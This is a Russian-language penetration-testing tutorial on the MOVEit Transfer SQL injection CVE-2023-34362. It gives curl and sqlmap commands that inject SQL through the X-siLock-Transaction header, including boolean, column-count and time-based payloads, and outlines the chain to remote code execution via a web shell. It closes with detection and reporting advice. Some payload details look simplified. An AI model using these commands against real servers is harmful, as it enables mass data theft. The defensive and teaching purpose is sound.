## Вопрос, с которого всё начинается

Клиент просит проверить «файлообменник» — сервис, через который компании обмениваются документами. Это MOVEit Transfer: веб-приложение на ASP.NET, за которым лежат конфиденциальные файлы. В 2023 году группировка Cl0p использовала в нём уязвимость **CVE-2023-34362** для массового воровства данных у тысяч организаций. Уязвимость — SQL-инъекция, ведущая к выполнению кода. Разберём её по шагам.

## Что такое MOVEit и почему он в топе

**MOVEit Transfer** — корпоративный сервис управляемого файлового обмена (MFT). Через него банки, госорганы и компании передают друг другу архивы, выписки, персональные данные. Он стоит на периметре, потому что должен принимать файлы извне, и хранит **очень чувствительные** данные.

CVE-2023-34362 — **SQL-инъекция** (внедрение SQL-кода) в эндпоинте `human.aspx`, доступная **без аутентификации**. Через неё атакующий получал доступ к базе, создавал пользователя-админа, а затем загружал ASPX-шелл. Цепочка заканчивалась RCE и массовым скачиванием файлов. Именно эта цепочка и есть образец «appliance-атаки».

## Наш пример: MOVEit Transfer 2021.0.6

Цель — `https://moveit.target.example`. Определяем продукт и версию:

```
$ curl -s -k https://moveit.target.example/human.aspx | grep -i -o 'MOVEit[^<]*'
MOVEit Transfer
```

Версию уточняем по заголовкам и статике; диапазон CVE-2023-34362 — 2019.1.0 – 2023.0.3. Сборка **2021.0.6** уязвима.

## Шаг 1: найти точку инъекции

Уязвимость в эндпоинте `human.aspx`, куда параметры передаются в заголовке **`X-siLock-Transaction`**. Это нестандартный транспорт: данные идут не в теле и не в query, а в HTTP-заголовке. Поэтому обычный сканер её не увидит — нужно знать про заголовок.

Проверяем, что параметр вообще обрабатывается:

```
$ curl -s -k 'https://moveit.target.example/human.aspx' \
  -H 'X-siLock-Transaction: folder' -o /dev/null -w '%{http_code}\n'
200
```

## Шаг 2: подтвердить инъекцию (boolean)

Дальше — **boolean-инъекция**: подставляем условие и смотрим, меняется ли ответ. Истина и ложь должны давать разное поведение (длина ответа, код, текст):

```
$ curl -s -k 'https://moveit.target.example/human.aspx' \
  -H "X-siLock-Transaction: folder; AND 1=1" | wc -c
4821
$ curl -s -k 'https://moveit.target.example/human.aspx' \
  -H "X-siLock-Transaction: folder; AND 1=2" | wc -c
402
```

Разная длина — инъекция подтверждена. `AND 1=2` отсекает строки, и ответ «схлопывается».

## Шаг 3: извлечь данные

Дальше вытаскиваем данные. Сначала определяем СУБД (MOVEit использует MS SQL Server), затем — имена таблиц. Через UNION или boolean посимвольно достаём значение из таблицы настроек, где лежит флаг. Это медленно, поэтому автоматизируем `sqlmap`:

```
$ sqlmap -u 'https://moveit.target.example/human.aspx' \
  --headers='X-siLock-Transaction: folder' --dbms=mssql --batch --dbs
```

sqlmap подтверждает инъекцию и перечисляет базы. Дальше — `--dump` нужной таблицы.

## Шаг 4: путь к RCE

Исторически эксплойт шёл так: через SQLi создавали пользователя с правами, логинились, загружали ASPX-шелл (MOVEit позволяет загрузку), а затем — цепочка десериализации .NET (`TypeConfuseDelegate` / `LosFormatter`) для выполнения кода от `NETWORK SERVICE`. Полный RCE. Важно: это **деструктивная** часть — её применяют только после согласования и только на копии, потому что шелл и создание пользователя меняют систему.

## Шаг 5: что за MOVEit

За MOVEit стоят файлы клиентов, база с учётками, интеграции с AD и другими системами. Поэтому компрометация MOVEit — это не «один сервер», а утечка данных всех пользователей сервиса. В отчёте это описывают именно так: не RCE, а **масштаб утечки**.

## Что мы теперь знаем

- MOVEit Transfer — корпоративный файлообмен на периметре с чувствительными данными.
- CVE-2023-34362 — pre-auth SQLi в `human.aspx` через заголовок `X-siLock-Transaction`.
- Инъекция подтверждается boolean-условиями, данные вытягиваются sqlmap.
- Полная цепочка: SQLi → создание админа → ASPX-шелл → десериализация .NET → RCE.
- Настоящий ущерб — утечка файлов, а не сам RCE.

## Анатомия эндпоинта human.aspx

`human.aspx` — это обработчик, который интерфейс MOVEit использует для служебных операций. Он принимает заголовок **`X-siLock-Transaction`** и по его значению выбирает ветку логики. Значение похоже на команду: `folder`, `file`, `download`, `delete`. Именно в разборе этого значения разработчики и оставили конкатенацию строки с SQL-запросом — классическую причину инъекции.

Почему сканеры её не находят: инъекция не в URL и не в форме, а в **заголовке**. Автоматические сканеры, которые подставляют payload в query и body, до заголовка не добираются. Поэтому CVE прожила долго и стала массовой.

## Шаг 6: почему boolean, а не UNION сразу

UNION-инъекция удобна, но требует совпадения числа и типов колонок. В MOVEit запрос сложный, поэтому начинают с **boolean** — подставляют условия и наблюдают разницу. Как только понятно, что инъекция есть, можно переходить к UNION, подобрав число колонок через `ORDER BY 1..N`:

```
$ curl -s -k 'https://moveit.target.example/human.aspx' \
  -H 'X-siLock-Transaction: folder ORDER BY 5' -o /dev/null -w '%{http_code}\n'
200
$ curl -s -k 'https://moveit.target.example/human.aspx' \
  -H 'X-siLock-Transaction: folder ORDER BY 15' -o /dev/null -w '%{http_code}\n'
500
```

Пока `200` — колонок больше; на `500` — перебор. Так находят точное число колонок.

## Шаг 7: слепая инъекция и время

Если сервер не отражает данные вообще (слепая инъекция), используют **время**. В MS SQL это `WAITFOR DELAY`:

```
$ time curl -s -k 'https://moveit.target.example/human.aspx' \
  -H "X-siLock-Transaction: folder; IF (1=1) WAITFOR DELAY '0:0:5'"
real 0m5.1s
```

Пятисекундная задержка при истинном условии и мгновенный ответ при ложном — канал для посимвольного извлечения данных. Медленно, но работает даже там, где нет вывода.

## Шаг 8: цепочка до RCE

Полный путь CVE-2023-34362: (1) через SQLi читают таблицу пользователей и получают хеши; (2) либо создают нового пользователя с правами через тот же SQL; (3) логинятся; (4) MOVEit позволяет загружать файлы — грузят ASPX-шелл; (5) для выполнения кода в контексте приложения используют **десериализацию .NET**: MOVEit десериализует данные сессии из БД, и подсунутый объект запускает код. Цепочка гаджетов — `TypeConfuseDelegate` / `LosFormatter`.

Каждый шаг меняет состояние системы, поэтому это **деструктивная** эксплуатация: только по согласованию.

## Шаг 9: TTP группировки Cl0p

Cl0p использовала эту уязвимость не для «тихого» доступа, а для массового скачивания данных. Схема: получить RCE → развернуть веб-шелл `human2.aspx` для устойчивости → выкачать файлы через внутренние API → оставить записку с требованием выкупа. Урок для защищающихся: недостаточно закрыть RCE, нужно проверить, не выкачаны ли уже файлы.

## Шаг 10: детект и защита

Синяя команда ищет: POST к `human.aspx` с подозрительным `X-siLock-Transaction`, новые файлы `human2.aspx`/`*.aspx` в веб-каталоге, аномальные SQL-запросы в логах БД. Защита: патч (MOVEit закрыла CVE-2023-34362 в 2023.0.4), ограничение доступа к `human.aspx` снаружи, WAF-правило на заголовок.

## Частая ошибка

Новичок, увидев SQLi, сразу запускает `sqlmap --dump-all`. На проде это выкачивает всю базу и вешает сервис. Правильно: подтвердить инъекцию boolean-условием, извлечь только одну ячейку-доказательство, зафиксировать и остановиться.

## Разбор: почему это стало массовым

CVE-2023-34362 уникальна масштабом. Причина — сочетание трёх факторов. Во-первых, MOVEit стоит у **тысяч** организаций, включая госсектор и банки. Во-вторых, уязвимость **pre-auth**: не нужен ни логин, ни доступ к внутренней сети — только сетевой доступ к `human.aspx`. В-третьих, эксплуатация давала не просто RCE, а прямой доступ к **файлам пользователей** — то есть к тому самому, что MFT и защищает.

Группировка Cl0p превратила это в конвейер: сканирование интернета на уязвимые MOVEit, автоматическая эксплуатация, выкачивание файлов, требование выкупа. Урок: уязвимость на периметре с pre-auth и доступом к данным — это не «ещё один баг», а потенциальный массовый инцидент.

## Что писать в отчёте

Отчёт по MOVEit фиксирует: версию и её источник; подтверждение SQLi (boolean-условие с разными ответами); тип (pre-auth); **что в базе** (учётки, настройки); потенциальный масштаб (какие файлы доступны); рекомендацию — патч до 2023.0.4, WAF-правило на `X-siLock-Transaction`, проверка логов на уже состоявшийся доступ. Обязательно отметь: даже после патча надо проверить, не создан ли `human2.aspx` и не выкачаны ли файлы.

## Ошибки и антипаттерны

Три ошибки новичка. Первая — запускать полный эксплойт сразу: цепочка создаёт пользователя и пишет шелл, то есть меняет систему; это недопустимо без согласования. Вторая — `sqlmap --dump-all` на проде: выкачивает всю базу и вешает сервис. Третья — не проверять заголовочный транспорт: тестировщик подставляет payload в query, ничего не находит и делает вывод «не уязвимо», хотя точка инъекции — в `X-siLock-Transaction`. Правило: у appliance сначала выясни, как продукт передаёт параметры, и только потом фазь.

## Индикаторы в IIS-логах и детект

Эксплуатация MOVEit (CVE-2023-34362) оставляет следы в `C:\inetpub\logs\LogFiles\W3SVC*`. Что искать:

- POST на `/human.aspx` или `/moveitisapi/moveitisapi.dll` с подозрительно длинным заголовком `X-siLock-Transaction` (SQLi в заголовке) — базовая сигнатура Cl0p.
- **Загрузка `.cmdline`**: запросы к `/api/v1/folders/...` и появление файлов с расширением `.cmdline` в `C:\MOVEitTransfer\wwwroot\`.
- Обращения к `/guestaccess.aspx` (CVE-2023-34362) и создание `human2.aspx` в web-root — веб-шелл.
- Всплеск запросов к `/human.aspx` с кодами 200 после серии 500 при необычных `ASP.NET_SessionId`.

Детект-правило: коррелировать POST на `human.aspx` с последующим GET на новосозданный `.aspx`. Ответные действия — изоляция, ротация всех секретов MOVEit, проверка исходящего трафика на предмет exfil (Cl0p выгружал данные зашифрованными архивами). В отчёте фиксируйте не только сам SQLi, но и **окно** между первым подозрительным запросом и появлением шелла.
